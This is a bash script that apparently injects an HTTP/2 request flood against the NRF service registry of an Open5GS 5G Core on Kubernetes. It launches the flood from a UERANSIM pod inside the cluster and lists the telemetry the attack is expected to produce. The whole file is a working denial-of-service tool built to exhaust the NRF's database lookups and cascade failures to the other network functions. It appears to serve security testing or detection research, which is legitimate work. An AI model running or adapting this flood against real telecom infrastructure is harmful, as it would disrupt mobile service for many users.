#!/usr/bin/env bash
# inject_nrf_sbi_flood.sh
# ───────────────────────
# Injects an HTTP/2 SBI flood on the NRF by hammering its NF-management and
# NF-discovery endpoints with concurrent requests from inside the cluster.
#
# NRF is the service registry for the entire 5G Core — every NF queries it
# for service discovery. Overloading NRF cascades to all other NFs.
# This simulates a registration/discovery exhaustion attack (3GPP TR 33.926).
#
# Endpoint choices:
#   /nnrf-nfm/v1/nf-instances        — NF list query (MongoDB lookup per req)
#   /nnrf-disc/v1/nf-instances?...   — NF discovery (query + filter per req)
#
# Usage: ./inject_nrf_sbi_flood.sh [concurrency] [duration_seconds]
# Default: 20 concurrent workers, 300 seconds

set -euo pipefail

CONCURRENCY=${1:-20}
DURATION=${2:-300}

# Dynamically resolve NRF SBI ClusterIP — robust across cluster recreates
NRF_IP=$(kubectl get svc -n open5gs open5gs-nrf-sbi \
    -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "")

if [[ -z "$NRF_IP" ]]; then
    echo "ERROR: Could not resolve NRF SBI ClusterIP. Is the cluster running?"
    echo "  kubectl get svc -n open5gs open5gs-nrf-sbi"
    exit 1
fi

NRF_SBI="http://${NRF_IP}:7777"
# NF-management list endpoint — forces MongoDB lookup, realistic discovery-style request
ENDPOINT="${NRF_SBI}/nnrf-nfm/v1/nf-instances"

echo "[nrf-flood] Target: ${ENDPOINT}"
echo "[nrf-flood] Concurrency: ${CONCURRENCY} workers"
echo "[nrf-flood] Duration: ${DURATION}s"
echo "[nrf-flood] Protocol: HTTP/2 cleartext (h2c)"
echo "[nrf-flood] Effect: NRF MongoDB query exhaustion, cascades to all NF discovery"
echo ""

# Find ueransim-ues pod inside the cluster to run from
UE_NS=$(kubectl get pods --all-namespaces | grep -i "ueransim-ues" | grep -v "Terminating" | head -1 | awk '{print $1}')
UE_POD=$(kubectl get pods --all-namespaces | grep -i "ueransim-ues" | grep -v "Terminating" | head -1 | awk '{print $2}')

if [[ -z "$UE_POD" ]]; then
    echo "ERROR: Could not find ueransim-ues pod"
    exit 1
fi
echo "[nrf-flood] Running flood from pod: $UE_POD ($UE_NS)"

FLOOD_SCRIPT=$(cat <<'INNER'
#!/bin/sh
ENDPOINT="$1"
CONCURRENCY="$2"
DURATION="$3"

END_TIME=$(( $(date +%s) + DURATION ))
WAVE=0

while [ $(date +%s) -lt $END_TIME ]; do
    REMAINING=$(( END_TIME - $(date +%s) ))
    WAVE=$(( WAVE + 1 ))
    echo "[wave $WAVE] ${REMAINING}s remaining — launching $CONCURRENCY requests..."

    i=0
    while [ $i -lt $CONCURRENCY ]; do
        curl -s --max-time 3 --http2-prior-knowledge \
            "$ENDPOINT" -o /dev/null 2>/dev/null &
        i=$(( i + 1 ))
    done
    wait
    sleep 1
done

echo "[nrf-flood] Done — ran $WAVE waves over ${DURATION}s"
INNER
)

kubectl exec -n "$UE_NS" "$UE_POD" -- sh -c "$FLOOD_SCRIPT" -- "$ENDPOINT" "$CONCURRENCY" "$DURATION"

echo ""
echo "[nrf-flood] Flood complete. Expected telemetry:"
echo "  - Prometheus: NRF cpu_rate spike, net_rx_rate spike"
echo "  - Loki: flood of NRF SBI request logs + potential cascade errors in AMF/SMF"
echo "  - Jaeger: high volume NRF SBI spans"
